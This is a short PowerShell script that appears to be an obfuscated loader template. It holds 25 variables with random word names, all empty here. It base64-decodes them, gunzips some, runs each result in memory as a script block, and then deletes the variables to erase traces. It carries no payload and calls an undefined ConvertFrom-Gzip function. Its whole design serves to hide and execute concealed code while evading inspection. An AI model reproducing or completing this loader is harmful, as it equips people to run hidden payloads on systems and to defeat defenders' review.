#Requires -Version 2

$Stuttering = ""
$Complement = ""
$Immunology = ""
$Reputation = ""
$Herbaceous = ""
$Barberries = ""
$Predictive = ""
$Skylarking = ""
$Summarizes = ""
$Interjects = ""
$Execrating = ""
$Constipate = ""
$Unaccented = ""
$Primordial = ""
$Brainchild = ""
$Illuminate = ""
$Unsteadily = ""
$Storehouse = ""
$Untimelier = ""
$Remodelled = ""
$Seemliness = ""
$Panhandled = ""
$Reconciles = ""
$Northwards = ""
$Foretastes = ""

$Modules = @($Stuttering,$Complement,$Immunology,$Reputation,$Herbaceous,$Barberries,$Predictive,$Skylarking,$Summarizes,$Interjects,$Execrating,$Constipate,$Unaccented,$Primordial,$Brainchild,$Illuminate,$Unsteadily,$Storehouse,$Untimelier,$Remodelled,$Seemliness,$Panhandled,$Reconciles,$Northwards,$Foretastes)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Stuttering","Complement","Immunology","Reputation","Herbaceous","Barberries","Predictive","Skylarking","Summarizes","Interjects","Execrating","Constipate","Unaccented","Primordial","Brainchild","Illuminate","Unsteadily","Storehouse","Untimelier","Remodelled","Seemliness","Panhandled","Reconciles","Northwards","Foretastes") | ForEach-Object { Remove-Variable -Name $_ }
